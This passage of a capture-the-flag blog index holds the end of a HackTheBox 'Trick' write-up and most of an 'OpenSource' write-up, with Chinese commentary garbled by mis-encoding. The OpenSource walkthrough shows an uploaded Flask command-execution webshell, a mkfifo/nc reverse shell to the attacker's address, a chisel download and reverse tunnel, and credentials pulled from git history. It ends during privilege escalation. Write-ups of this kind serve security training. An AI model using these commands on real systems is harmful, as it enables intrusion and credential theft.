nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: Coming Soon - Start Bootstrap Theme\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=32194%PV=Y%DS=2%DC=T%G=Y%TM=62AFD3E\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=B)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   221.19 ms 10.10.14.1\n2   221.28 ms 10.10.11.166\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 82.62 seconds\n```\n## Http\n![image](Hackthebox-Trick/fa08a205-35fb-483f-acfb-a3592fd1650c.png)\n\næœ‰ç‚¹ä¸å¤ªç†è§£è¿™æ˜¯ä»€ä¹ˆç½‘ç«™ï¼Œä¸è¿‡å¯ä»¥æœ‰ä¸ªè®¢é˜…åŠŸèƒ½ï¼Œéšä¾¿å¡«ä¸€ä¸ªé‚®ç®±è¯•è¯•çœ‹\n\n![image](Hackthebox-Trick/75f3705b-561b-4eff-9dfe-46912e4eed5f.png)\n\nç»™å›äº†ä¸ªç½‘ç«™ï¼Œåº”è¯¥æ˜¯ç›´æ¥æç¤ºäº†ä½¿ç”¨çš„æ¡†æ¶","tags":["Hackthebox"]},{"title":"OpenSource - Hackthebox","url":"/2022/06/07/Hackthebox/Easy/Hackthebox-OpenSource/","content":"\n# Hackthebox - OpenSource\n# é¶åœºä¿¡æ¯\n![](Hackthebox-OpenSource/7c8a2553-c178-411e-be99-f0be9eb6eafe.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-OpenSource/76d216ed-bd37-4d40-831e-75674e82213d.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.164\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-06-06 14:49 CST\nWarning: 10.10.11.164 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.164\nHost is up (0.18s latency).\nNot shown: 62504 closed ports, 3029 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)\n|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)\n|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)\n80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 06 Jun 2022 06:56:05 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 5316\n|     Connection: close\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"UTF-8\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n|     <title>upcloud - Upload files for Free!</title>\n|     <script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"></script>\n|     <script src=\"/static/vendor/popper/popper.min.js\"></script>\n|     <script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"></script>\n|     <script src=\"/static/js/ie10-viewport-bug-workaround.js\"></script>\n|     <link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/>\n|     <link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/>\n|     <link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/>\n|     <link rel=\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 06 Jun 2022 06:56:06 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Allow: OPTIONS, HEAD, GET\n|     Content-Length: 0\n|     Connection: close\n|   RTSPRequest:\n|     <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n|     \"http://www.w3.org/TR/html4/strict.dtd\">\n|     <html>\n|     <head>\n|     <meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\">\n|     <title>Error response</title>\n|     </head>\n|     <body>\n|     <h1>Error response</h1>\n|     <p>Error code: 400</p>\n|     <p>Message: Bad request version ('RTSP/1.0').</p>\n|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>\n|     </body>\n|_    </html>\n|_http-server-header: Werkzeug/2.1.2 Python/3.10.3\n|_http-title: upcloud - Upload files for Free!\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port80-TCP:V=7.91%I=7%D=6/6%Time=629DA3F6%P=x86_64-pc-linux-gnu%r(GetRe\nSF:quest,1573,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Py\nSF:thon/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x20Jun\\x202022\\x2006:56:05\\x20GMT\\\nSF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x205\nSF:316\\r\\nConnection:\\x20close\\r\\n\\r\\n<html\\x20lang=\\\"en\\\">\\n<head>\\n\\x20\\\nSF:x20\\x20\\x20<meta\\x20charset=\\\"UTF-8\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\nSF:\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\\\">\\n\nSF:\\x20\\x20\\x20\\x20<title>upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free!<\nSF:/title>\\n\\n\\x20\\x20\\x20\\x20<script\\x20src=\\\"/static/vendor/jquery/jquer\nSF:y-3\\.4\\.1\\.min\\.js\\\"></script>\\n\\x20\\x20\\x20\\x20<script\\x20src=\\\"/stati\nSF:c/vendor/popper/popper\\.min\\.js\\\"></script>\\n\\n\\x20\\x20\\x20\\x20<script\\\nSF:x20src=\\\"/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\\"></script>\\n\\x\nSF:20\\x20\\x20\\x20<script\\x20src=\\\"/static/js/ie10-viewport-bug-workaround\\\nSF:.js\\\"></script>\\n\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\nSF:\\\"/static/vendor/bootstrap/css/bootstrap\\.css\\\"/>\\n\\x20\\x20\\x20\\x20<lin\nSF:k\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"\\x20/static/vendor/bootstrap/css/boot\nSF:strap-grid\\.css\\\"/>\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20hre\nSF:f=\\\"\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\\"/>\\n\\n\\x20\\\nSF:x20\\x20\\x20<link\\x20rel=\")%r(HTTPOptions,C7,\"HTTP/1\\.1\\x20200\\x20OK\\r\\n\nSF:Server:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x\nSF:20Jun\\x202022\\x2006:56:06\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20char\nSF:set=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET\\r\\nContent-Length:\\x200\nSF:\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,1F4,\"<!DOCTYPE\\x20HTML\nSF:\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\\"http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\">\\n<html>\\n\\x2\nSF:0\\x20\\x20\\x20<head>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<meta\\x20http-equi\nSF:v=\\\"Content-Type\\\"\\x20content=\\\"text/html;charset=utf-8\\\">\\n\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20<title>Error\\x20response</title>\\n\\x20\\x20\\x20\\x20\nSF:</head>\\n\\x20\\x20\\x20\\x20<body>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<h1>Er\nSF:ror\\x20response</h1>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<p>Error\\x20code:\nSF:\\x20400</p>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<p>Message:\\x20Bad\\x20requ\nSF:est\\x20version\\x20\\('RTSP/1\\.0'\\)\\.</p>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20<p>Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20B\nSF:ad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.</p>\\n\\x20\\x20\\\nSF:x20\\x20</body>\\n</html>\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/6%OT=22%CT=1%CU=35351%PV=Y%DS=2%DC=T%G=Y%TM=629DA462\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11\nOS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 199/tcp)\nHOP RTT       ADDRESS\n1   176.47 ms 10.10.14.1\n2   177.14 ms 10.10.11.164\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 249.84 seconds\n```\n## Http\n![](Hackthebox-OpenSource/53df5e0c-6b49-41b0-8ece-96a499608f89.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªä»€ä¹ˆäº‘å¹³å°ï¼Œæ ¹æ® Nmap æ‰«æåˆ°çš„ç»“æœ Werkzeug/2.1.2 è¿›è¡Œæœç´¢ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªè·¯å¾„ /console \n\n![](Hackthebox-OpenSource/9ea9f6d0-14d8-4935-aea8-8aaa5406a270.png)\n\nä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç½‘ç»œä¸Šæåˆ°çš„ä»¥åŠ MSF å†…çš„ exp éƒ½æ²¡æœ‰æˆåŠŸ\n\n![](Hackthebox-OpenSource/4eacb2fb-9457-4f89-b102-abcf251f58d8.png)\n\nä¸»é¡µæœ‰ä¸€ä¸ªæ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œä¸‹è½½åè¿›è¡Œè§£å‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source/app/app]\nâ””â”€# cat views.py \nimport os\n\nfrom app.utils import get_file_name\nfrom flask import render_template, request, send_file\n\nfrom app import app\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        f = request.files['file']\n        file_name = get_file_name(f.filename)\n        file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name)\n        f.save(file_path)\n        return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name)\n    return render_template('upload.html')\n\n@app.route('/uploads/<path:path>')\ndef send_report(path):\n    path = get_file_name(path)\n    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\n```\nåœ¨ /source/app/app/views.py ä¸­çœ‹åˆ°ç‚¹æœ‰è¶£çš„å†…å®¹ï¼Œ[http://10.10.11.164/upcloud](http://10.10.11.164/upcloud) ç„¶åè¿™è¾¹è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ã€‚\n\né‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¼ªé€  [views.py](http://views.py) çš„å†…å®¹ï¼Œç„¶åä¼ ä¸Šå»è·å¾—åˆ©ç”¨å‘¢ï¼Ÿ\n\n# æ¼æ´åˆ©ç”¨\n```bash\n@app.route('/exec')\ndef cmd():\n    return os.system(request.args.get('cmd'))\n```\nåœ¨ [views.py](http://views.py) çš„æœ€ååŠ ä¸Šè¿™ä¹ˆä¸€å¥ï¼Œç„¶åå»ä¸Šä¼ ï¼Œä½¿ç”¨ burp è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åæŠŠæˆ‘ä»¬ä¿®æ”¹çš„å†…å®¹åŠ è¿›å»\n\n![](Hackthebox-OpenSource/89238808-9963-4de7-8f83-73df9aa7973d.png)\n\n![](Hackthebox-OpenSource/d5b9c976-687a-413b-aacf-348b880fcfc4.png)\n\nä¼ ä¸Šå»åæŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-OpenSource/bb34b0fc-d27f-4f2a-8808-e3b808875f95.png)\n\nç¡®å®šæ˜¯å·²ç»ä¼ ä¸Šå»äº†\n\nä½†æ˜¯æ— æ³•è®¿é—®å’Œæ‰§è¡Œï¼Œæˆ‘ä»¬å»ä¿®æ”¹ä¸€ä¸‹è·¯å¾„è¯•è¯•\n\n![](Hackthebox-OpenSource/62cae123-7c42-4a93-aec4-06a016e0dcad.png)\n\n![](Hackthebox-OpenSource/c00b900c-95ac-4b2e-8c7d-4f7e9350cf71.png)\n\nä¼¼ä¹æ˜¯è¢« WAF ç»™æ‹¦æˆªäº†ï¼Œå°è¯•ç»•è¿‡ä¸€ä¸‹\n\n![](Hackthebox-OpenSource/7764758b-ebb1-4eba-ad1f-5b0b3d573e67.png)\n\n![](Hackthebox-OpenSource/5e590cd3-af9c-4edd-8a40-095895779953.png)\n\nç„¶åå°±æˆåŠŸäº†ï¼Œå»è®¿é—®ä¸€ä¸‹å§\n\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\nç„¶åè®¿é—®æˆ‘ä»¬çš„ webshell\n\n```bash\nhttp://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.33%204444%20%3E%2Ftmp%2Ff\n```\nå°±å¾—åˆ°äº†ä¸€ä¸ª shell\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.33] from (UNKNOWN) [10.10.11.164] 41083\n/bin/sh: can't access tty; job control turned off\n/app # whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n```bash\n/app # ifconfig\neth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  \n          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8217 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:4351 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:595585 (581.6 KiB)  TX bytes:1844757 (1.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n```\nçœ‹ç€ä¸å¤ªå¯¹ï¼Œæ„Ÿè§‰åƒæ˜¯åœ¨ docker é‡Œ\n\n```bash\n/home # ls -la /\ntotal 72\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 .\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 ..\n-rwxr-xr-x    1 root     root             0 Jun  6 08:06 .dockerenv\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 app\ndrwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin\ndrwxr-xr-x    5 root     root           340 Jun  6 08:06 dev\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 etc\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 home\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 lib\ndrwxr-xr-x    5 root     root          4096 May  4 16:35 media\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 mnt\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 opt\ndr-xr-xr-x  233 root     root             0 Jun  6 08:06 proc\ndrwx------    1 root     root          4096 May  4 16:35 root\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 run\ndrwxr-xr-x    1 root     root          4096 Mar 17 05:52 sbin\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 srv\ndr-xr-xr-x   13 root     root             0 Jun  6 08:06 sys\ndrwxrwxrwt    1 root     root          4096 Jun  6 13:33 tmp\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 usr\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 var\n```\nç¡®å®æ˜¯åœ¨ docker é‡Œ\n\n# è™šæ‹Ÿæœºé€ƒé€¸\n> [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\n\nè¿™è¾¹ä½¿ç”¨ chisel æ¥è¿›è¡Œé€ƒé€¸ï¼Œæˆ‘ä»¬å…ˆæƒ³åŠæ³•ç»™å¼„åˆ°é¶æœºé‡Œ\n\n```bash\n/dev/shm # wget http://10.10.14.33:8000/chisel\nConnecting to 10.10.14.33:8000 (10.10.14.33:8000)\nsaving to 'chisel'\nchisel                 2% |                                |  178k  0:00:43 ETA\nchisel                26% |********                        | 2075k  0:00:05 ETA\nchisel                39% |************                    | 3110k  0:00:04 ETA\nchisel                53% |*****************               | 4202k  0:00:03 ETA\nchisel                69% |**********************          | 5495k  0:00:02 ETA\nchisel                81% |**************************      | 6462k  0:00:01 ETA\nchisel                92% |*****************************   | 7327k  0:00:00 ETA\nchisel               100% |********************************| 7888k  0:00:00 ETA\n'chisel' saved\n```\n```bash\n/dev/shm # ls\nchisel\n/dev/shm # ./chisel\n/bin/sh: ./chisel: Permission denied\n/dev/shm # ls -la\ntotal 7888\ndrwxrwxrwt    2 root     root            60 Jun  6 13:47 .\ndrwxr-xr-x    5 root     root           340 Jun  6 08:06 ..\n-rw-r--r--    1 root     root       8077312 Jun  6 13:46 chisel\n/dev/shm # chmod 777 chisel\n/dev/shm # ./chisel\n/bin/sh: ./chisel: Permission denied\n```\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨ /dev/shm æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™çš„ï¼Œå³ä½¿ç»™äº†æƒé™ä¹Ÿæ— æ³•æ‰§è¡Œ\n\n```bash\n/dev/shm # mv chisel /app\n/dev/shm # cd /app\n/app # ls\nINSTALL.md\napp\nchisel\npublic\nrun.py\n/app # ./chisel\n\n  Usage: chisel [command] [--help]\n\n  Version: 1.7.7 (go1.17.6)\n\n  Commands:\n    server - runs chisel in server mode\n    client - runs chisel in client mode\n\n  Read more:\n    https://github.com/jpillora/chisel\n```\nå˜é€šä¸€ä¸‹ï¼Œæ¢ä¸ªä½ç½®å°±å¯ä»¥æ‰§è¡Œäº†\n\nè¿™è¾¹ç»™å‡ºæç¤ºäº†ï¼Œæˆ‘ä»¬å»å¼€å¯ä¸€ä¸ª socks5 é€šé“å§\n\n```bash\næœ¬åœ°\n./chisel server --reverse --port 6969\n\né¶æœº\n./chisel client 10.10.14.33:6969 R:172.17.0.1:3000\n```\n```bash\næœ¬æœº\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ./chisel server --reverse --port 6969\n2022/06/06 22:03:03 server: Reverse tunnelling enabled\n2022/06/06 22:03:03 server: Fingerprint eok9TFfTK+YpN31Xcx/GZgBfBuElFqfn/SWgZD8lLLU=\n2022/06/06 22:03:03 server: Listening on http://0.0.0.0:6969\n2022/06/06 22:11:28 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening\n\né¶æœº\n/app # ./chisel client 10.10.16.2:6969 R:172.17.0.1:3000\n2022/06/07 02:11:23 client: Connecting to ws://10.10.16.2:6969\n2022/06/07 02:11:27 client: Connected (Latency 276.641246ms)\n```\n![](Hackthebox-OpenSource/b87b90ff-aeeb-44d6-bfd2-f69fc707a039.png)\n\nç„¶åè®¿é—® 127.0.0.1:3000 æˆåŠŸè®¿é—®\n\n![](Hackthebox-OpenSource/6c1a8fb0-ca71-434c-8659-4d8cc4f58784.png)\n\næ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»å…¥åï¼Œåœ¨æ¢ç´¢çš„ç”¨æˆ·é‡Œå‘ç°æœ‰ä¸€ä¸ªåä¸º dev01 çš„ç”¨æˆ·\n\n```bash\ngit show-branch\ngit log dev --oneline\ngit show a76f8f7\n```\nä½¿ç”¨ä»¥ä¸Šä¸‰æ¡å‘½ä»¤è·å–æˆ‘ä»¬è¦çš„è´¦æˆ·å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source]\nâ””â”€# git show-branch                                                                                                                       1 âš™\n! [dev] ease testing\n * [public] clean up dockerfile for production use\n--\n * [public] clean up dockerfile for production use\n+  [dev] ease testing\n+  [dev^] added gitignore\n+  [dev~2] updated\n+* [public^] initial\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source]\nâ””â”€# git log dev --oneline                                                                                                                 1 âš™\nc41fede (dev) ease testing\nbe4da71 added gitignore\na76f8f7 updated\nee9d9f1 initial\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source]\nâ””â”€# git show a76f8f7                                                                                                                      1 âš™\ncommit a76f8f75f7a4a12b706b0cf9c983796fa1985820\nAuthor: gituser <gituser@local>\nDate:   Thu Apr 28 13:46:16 2022 +0200\n\n    updated\n\ndiff --git a/app/.vscode/settings.json b/app/.vscode/settings.json\nnew file mode 100644\nindex 0000000..5975e3f\n--- /dev/null\n+++ b/app/.vscode/settings.json\n@@ -0,0 +1,5 @@\n+{\n+  \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",\n+  \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\",\n+  \"http.proxyStrictSSL\": false\n+}\ndiff --git a/app/app/views.py b/app/app/views.py\nindex f2744c6..0f3cc37 100644\n--- a/app/app/views.py\n+++ b/app/app/views.py\n@@ -6,7 +6,17 @@ from flask import render_template, request, send_file\n from app import app\n\n\n-@app.route('/', methods=['GET', 'POST'])\n+@app.route('/')\n+def index():\n+    return render_template('index.html')\n+\n+\n+@app.route('/download')\n+def download():\n+    return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\"))\n+\n+\n+@app.route('/upcloud', methods=['GET', 'POST'])\n def upload_file():\n     if request.method == 'POST':\n         f = request.files['file']\n@@ -20,4 +30,4 @@ def upload_file():\n @app.route('/uploads/<path:path>')\n def send_report(path):\n     path = get_file_name(path)\n-    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\n\\ No newline at end of file\n+    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\n```\nå¾—åˆ°äº†è´¦å·å¯†ç \n\n```bash\nusername = dev01\npassword = Soulless_Developer#2022\n```\nç„¶åå»ç™»é™†ä¸€ä¸‹ Gitea\n\n![](Hackthebox-OpenSource/96489c0c-ef30-431f-afab-06a6a77fe0ae.png)\n\nç™»é™†æˆåŠŸ\n\nè¿™è¾¹æœ‰ä¸€ä¸ª home-backup é¡¹ç›®ï¼Œå»çœ‹çœ‹\n\n![](Hackthebox-OpenSource/748621f0-c7b2-421c-a780-cdd3e37fef55.png)\n\nåœ¨é‡Œé¢å‘ç°äº†ä¸€ä¸ª .ssh æ–‡ä»¶å¤¹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ° ssh-key\n\n![](Hackthebox-OpenSource/069e2c21-40b0-4fde-a9ec-6834a2342426.png)\n\nNice æ‰¾åˆ°äº† ssh-key ç›´æ¥å»å°è¯•è¿æ¥ ssh\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh dev01@10.10.11.164 -i id_rsa\nThe authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.\nECDSA key fingerprint is SHA256:a6VljAI6pLD7/108ls+Bi5y88kWaYI6+V4lTU0KQsQU.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.164' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue Jun  7 03:07:46 UTC 2022\n\n  System load:  0.0               Processes:              241\n  Usage of /:   75.0% of 3.48GB   Users logged in:        0\n  Memory usage: 22%               IP address for eth0:    10.10.11.164\n  Swap usage:   0%                IP address for docker0: 172.17.0.1\n\n\n16 updates can be applied immediately.                                                                                                        \n9 of these updates are standard security updates.                                                                                             \nTo see these additional updates run: apt list --upgradable                                                                                    \n\n\nLast login: Mon May 16 13:13:33 2022 from 10.10.14.23                                                                                         \ndev01@opensource:~$ whoami&&id                                                                                                                \ndev01                                                                                                                                         \nuid=1000(dev01) gid=1000(dev01) groups=1000(dev01)\n```\næˆåŠŸé€ƒé€¸å‡ºæ¥\n\n```bash\ndev01@opensource:~$ ls                                                                                                                        \nuser.txt                                                                                                                                      \ndev01@opensource:~$ cat user.txt \n80fc1f5f07080181febb1098b2c7070c\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\ndev01@opensource:~$ ls -la\ntotal 44\ndrwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .\ndrwxr-xr-x 4 root  root  4096 May 16 12:51 ..\nlrwxrwxrwx 1 dev01 dev01    9 Mar 23 01:21 .bash_history -> /dev/null\n-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc\ndrwx------ 2 dev01 dev01 4096 May  4 16:35 .cache\ndrwxrwxr-x 8 dev01 dev01 4096 Jun  7 03:09 .git\ndrwx------ 3 dev01 dev01 4096 May  4 16:35 .gnupg\ndrwxrwxr-x 3 dev01 dev01 4096 May  4 16:35 .local\n-rw-r--r-- 1 dev01 dev01  807 Apr  4  2018 .profile\ndrwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh\n-rw-r----- 1 root  dev01   33 Jun  7 01:50 user.txt\ndev01@opensource:~$ cd .git\ndev01@opensource:~/.git$ ls -la\ntotal 56\ndrwxrwxr-x  8 dev01 dev01 4096 Jun  7 03:09 .\ndrwxr-xr-x  7 dev01 dev01 4096 May 16 12:51 